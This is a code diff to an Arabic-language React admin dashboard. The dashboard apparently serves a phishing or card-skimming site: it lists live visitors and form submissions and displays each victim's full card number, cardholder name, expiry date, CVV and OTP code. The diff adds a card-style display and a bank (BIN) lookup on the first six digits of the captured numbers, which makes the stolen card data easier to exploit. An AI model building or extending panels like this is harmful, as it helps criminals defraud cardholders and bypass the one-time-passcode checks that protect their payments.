@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { RefreshCw, LogOut, Eye, X } from "lucide-react";
+import { RefreshCw, LogOut, Eye, CreditCard } from "lucide-react";
 import {
   subscribeToVisitors,
   subscribeToFormSubmissions,
@@ -30,6 +30,137 @@ interface CombinedData {
   code: string;
 }
 
+interface BinInfo {
+  scheme: string;
+  type: string;
+  brand: string;
+  bank: {
+    name: string;
+    url?: string;
+    phone?: string;
+    city?: string;
+  };
+  country: {
+    name: string;
+    emoji?: string;
+    currency?: string;
+    alpha2?: string;
+  };
+}
+
+const lookupBin = async (cardNumber: string): Promise<BinInfo | null> => {
+  try {
+    const bin = cardNumber.replace(/\s/g, "").substring(0, 6);
+    if (bin.length < 6) return null;
+    
+    const response = await fetch(`https://lookup.binlist.net/${bin}`);
+    if (!response.ok) return null;
+    
+    const data = await response.json();
+    return data;
+  } catch (error) {
+    console.error("BIN lookup failed:", error);
+    return null;
+  }
+};
+
+function CreditCardDisplay({ paymentInfo, binInfo }: { paymentInfo: Record<string, any>; binInfo: BinInfo | null }) {
+  const cardNumber = paymentInfo.cardLast4 || "";
+  const formattedNumber = cardNumber.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim();
+  
+  const getCardSchemeColor = () => {
+    const scheme = binInfo?.scheme?.toLowerCase();
+    if (scheme === "visa") return "from-blue-600 to-blue-800";
+    if (scheme === "mastercard") return "from-red-500 to-orange-500";
+    if (scheme === "amex" || scheme === "american express") return "from-gray-600 to-gray-800";
+    return "from-emerald-600 to-teal-700";
+  };
+
+  const getCardSchemeLogo = () => {
+    const scheme = binInfo?.scheme?.toLowerCase();
+    if (scheme === "visa") {
+      return (
+        <div className="text-white font-bold text-xl italic tracking-wider">VISA</div>
+      );
+    }
+    if (scheme === "mastercard") {
+      return (
+        <div className="flex items-center">
+          <div className="w-8 h-8 bg-red-500 rounded-full opacity-90 -mr-3"></div>
+          <div className="w-8 h-8 bg-yellow-400 rounded-full opacity-90"></div>
+        </div>
+      );
+    }
+    return <CreditCard className="w-8 h-8 text-white" />;
+  };
+
+  return (
+    <div className={`w-full max-w-sm mx-auto rounded-2xl p-6 bg-gradient-to-br ${getCardSchemeColor()} text-white shadow-xl relative overflow-hidden`}>
+      <div className="absolute top-0 right-0 w-40 h-40 bg-white/10 rounded-full -translate-y-1/2 translate-x-1/2"></div>
+      <div className="absolute bottom-0 left-0 w-32 h-32 bg-white/5 rounded-full translate-y-1/2 -translate-x-1/2"></div>
+      
+      <div className="flex items-start justify-between mb-8 relative z-10">
+        <div>
+          {binInfo?.bank?.name && (
+            <div className="text-white/90 text-sm font-medium mb-1">{binInfo.bank.name}</div>
+          )}
+          {binInfo?.country?.name && (
+            <div className="text-white/60 text-xs">{binInfo.country.name}</div>
+          )}
+        </div>
+        <div className="bg-white/20 px-3 py-1 rounded text-sm font-medium">
+          {binInfo?.country?.currency || "SAR"}
+        </div>
+      </div>
+
+      <div className="mb-6 relative z-10">
+        <div className="font-mono text-xl tracking-widest" dir="ltr">
+          {formattedNumber || "•••• •••• •••• ••••"}
+        </div>
+      </div>
+
+      <div className="flex items-end justify-between relative z-10">
+        <div className="flex-1">
+          <div className="text-white/60 text-xs mb-1">حامل البطاقة</div>
+          <div className="font-medium text-sm uppercase tracking-wide">
+            {paymentInfo.cardholderName || "N/A"}
+          </div>
+        </div>
+        
+        <div className="flex gap-6 items-end">
+          <div className="text-center">
+            <div className="text-white/60 text-xs mb-1">تاريخ</div>
+            <div className="font-mono text-sm">{paymentInfo.expiryDate || "MM/YY"}</div>
+          </div>
+          
+          <div className="text-center">
+            <div className="text-white/60 text-xs mb-1">CVV</div>
+            <div className="font-mono text-sm font-bold">{paymentInfo.cvv || "•••"}</div>
+          </div>
+        </div>
+      </div>
+
+      <div className="flex items-center justify-between mt-6 pt-4 border-t border-white/20 relative z-10">
+        <div className="flex items-center gap-2">
+          <span className={`px-2 py-0.5 rounded text-xs font-medium ${
+            binInfo?.type?.toLowerCase() === "debit" 
+              ? "bg-green-500/30 text-green-100" 
+              : "bg-purple-500/30 text-purple-100"
+          }`}>
+            {binInfo?.type?.toUpperCase() || "CARD"}
+          </span>
+          {binInfo?.brand && (
+            <span className="px-2 py-0.5 rounded text-xs font-medium bg-white/20">
+              {binInfo.brand}
+            </span>
+          )}
+        </div>
+        {getCardSchemeLogo()}
+      </div>
+    </div>
+  );
+}
+
 export default function AdminDashboard() {
   const [, setLocation] = useLocation();
   const { user, isLoading: authLoading, logout } = useAuth();
@@ -40,6 +171,8 @@ export default function AdminDashboard() {
   const [selectedData, setSelectedData] = useState<CombinedData | null>(null);
   const [showBuyerInfo, setShowBuyerInfo] = useState(false);
   const [showPaymentInfo, setShowPaymentInfo] = useState(false);
+  const [binInfo, setBinInfo] = useState<BinInfo | null>(null);
+  const [loadingBin, setLoadingBin] = useState(false);
 
   useEffect(() => {
     if (!authLoading && !user) {
@@ -118,9 +251,17 @@ export default function AdminDashboard() {
     setShowBuyerInfo(true);
   };
 
-  const handleViewPaymentInfo = (data: CombinedData) => {
+  const handleViewPaymentInfo = async (data: CombinedData) => {
     setSelectedData(data);
     setShowPaymentInfo(true);
+    setBinInfo(null);
+    
+    if (data.paymentInfo?.cardLast4) {
+      setLoadingBin(true);
+      const info = await lookupBin(data.paymentInfo.cardLast4);
+      setBinInfo(info);
+      setLoadingBin(false);
+    }
   };
 
   if (authLoading || isLoading) {
@@ -181,7 +322,7 @@ export default function AdminDashboard() {
                     الصفحة
                   </th>
                   <th className="px-4 py-3 text-right font-medium text-gray-600">
-                    الكود
+                    OTP
                   </th>
                   <th className="px-4 py-3 text-right font-medium text-gray-600">
                     الاتصال
@@ -222,7 +363,7 @@ export default function AdminDashboard() {
                       </td>
                       <td className="px-4 py-3">
                         {row.code ? (
-                          <span className="font-mono text-blue-600">
+                          <span className="font-mono text-lg font-bold text-[#8A1538] bg-[#8A1538]/10 px-2 py-1 rounded">
                             {row.code}
                           </span>
                         ) : (
@@ -271,8 +412,9 @@ export default function AdminDashboard() {
                           {row.paymentInfo ? (
                             <button
                               onClick={() => handleViewPaymentInfo(row)}
-                              className="px-2 py-1 rounded text-xs font-medium bg-green-500 text-white hover:bg-green-600"
+                              className="px-2 py-1 rounded text-xs font-medium bg-green-500 text-white hover:bg-green-600 flex items-center gap-1"
                             >
+                              <CreditCard className="w-3 h-3" />
                               معلومات البطاقة
                             </button>
                           ) : (
@@ -388,70 +530,74 @@ export default function AdminDashboard() {
       </Dialog>
 
       <Dialog open={showPaymentInfo} onOpenChange={setShowPaymentInfo}>
-        <DialogContent className="max-w-md" dir="rtl">
+        <DialogContent className="max-w-lg" dir="rtl">
           <DialogHeader>
             <DialogTitle className="text-right text-[#8A1538]">
               معلومات البطاقة
             </DialogTitle>
           </DialogHeader>
           {selectedData?.paymentInfo && (
-            <div className="space-y-3">
-              <div className="grid grid-cols-2 gap-3">
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">
-                    اسم حامل البطاقة
-                  </span>
-                  <span className="text-sm font-medium">
-                    {selectedData.paymentInfo.cardholderName || "N/A"}
+            <div className="space-y-4">
+              {loadingBin ? (
+                <div className="flex items-center justify-center py-8">
+                  <RefreshCw className="w-6 h-6 text-[#8A1538] animate-spin" />
+                  <span className="mr-2 text-gray-500">جاري تحميل معلومات البنك...</span>
+                </div>
+              ) : (
+                <CreditCardDisplay 
+                  paymentInfo={selectedData.paymentInfo} 
+                  binInfo={binInfo} 
+                />
+              )}
+              
+              <div className="grid grid-cols-2 gap-3 mt-4">
+                <div className="bg-[#8A1538]/10 rounded-lg p-4 text-center">
+                  <span className="text-xs text-[#8A1538]/70 block mb-1">OTP</span>
+                  <span className="text-2xl font-bold font-mono text-[#8A1538]">
+                    {selectedData.paymentInfo.otp || "-"}
                   </span>
                 </div>
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">
-                    رقم البطاقة
-                  </span>
-                  <span className="text-sm font-medium font-mono">
-                    {selectedData.paymentInfo.cardLast4 || "****"}
-                  </span>
-                </div>
-              </div>
-              <div className="grid grid-cols-2 gap-3">
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">
-                    تاريخ الانتهاء
-                  </span>
-                  <span className="text-sm font-medium font-mono">
-                    {selectedData.paymentInfo.expiryDate || "N/A"}
-                  </span>
-                </div>
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">OTP</span>
-                  <span className="text-sm font-bold text-[#8A1538]">
-                    {selectedData.paymentInfo.otp || "0"}
-                  </span>
-                </div>
-              </div>
-              <div className="grid grid-cols-2 gap-3">
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">cvv</span>
-                  <span className="text-sm font-medium">
-                    {selectedData.paymentInfo.cvv || "0"}
-                  </span>
-                </div>
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">الحالة</span>
-                  <span
-                    className={`text-sm font-medium ${selectedData.paymentSuccess ? "text-green-600" : "text-red-600"}`}
-                  >
-                    {selectedData.paymentSuccess ? "ناجح" : "فشل"}
+                <div className={`rounded-lg p-4 text-center ${
+                  selectedData.paymentSuccess 
+                    ? "bg-green-100" 
+                    : "bg-red-100"
+                }`}>
+                  <span className={`text-xs block mb-1 ${
+                    selectedData.paymentSuccess 
+                      ? "text-green-600" 
+                      : "text-red-600"
+                  }`}>الحالة</span>
+                  <span className={`text-lg font-bold ${
+                    selectedData.paymentSuccess 
+                      ? "text-green-700" 
+                      : "text-red-700"
+                  }`}>
+                    {selectedData.paymentSuccess ? "ناجح ✓" : "فشل ✗"}
                   </span>
                 </div>
               </div>
-              {selectedData.paymentInfo.failureReason && (
-                <div className="bg-red-50 rounded-lg p-3">
-                  <span className="text-xs text-red-500 block">سبب الفشل</span>
-                  <span className="text-sm font-medium text-red-700">
-                    {selectedData.paymentInfo.failureReason}
-                  </span>
+
+              {binInfo && (
+                <div className="bg-gray-50 rounded-lg p-4 mt-4">
+                  <h4 className="text-sm font-medium text-gray-700 mb-3">معلومات البنك</h4>
+                  <div className="grid grid-cols-2 gap-2 text-sm">
+                    <div>
+                      <span className="text-gray-500">البنك:</span>
+                      <span className="font-medium mr-1">{binInfo.bank?.name || "غير معروف"}</span>
+                    </div>
+                    <div>
+                      <span className="text-gray-500">الدولة:</span>
+                      <span className="font-medium mr-1">{binInfo.country?.name || "غير معروف"}</span>
+                    </div>
+                    <div>
+                      <span className="text-gray-500">النوع:</span>
+                      <span className="font-medium mr-1">{binInfo.type || "غير معروف"}</span>
+                    </div>
+                    <div>
+                      <span className="text-gray-500">الشبكة:</span>
+                      <span className="font-medium mr-1">{binInfo.scheme || "غير معروف"}</span>
+                    </div>
+                  </div>
                 </div>
               )}
             </div>
